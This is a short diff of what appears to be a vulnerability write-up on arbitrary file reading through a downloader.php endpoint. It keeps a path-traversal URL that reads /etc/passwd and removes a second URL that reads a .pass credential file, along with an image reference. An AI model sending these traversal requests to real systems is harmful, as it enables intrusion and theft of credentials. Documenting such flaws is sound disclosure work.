@@ -33,10 +33,6 @@ Arbitrary file reading:
 
 <http://ip:port/downloader.php?file=/home/contec/conf/../../../../../../etc/passwd>
 
-<http://ip:port/downloader.php?file=/home/contec/conf/.pass>
-
-![](./images/media/image3.png){width="5.754861111111111in"
-height="2.2083333333333335in"}
 
 ![](./images/media/image4.png){width="5.7625in"
 height="2.892361111111111in"}
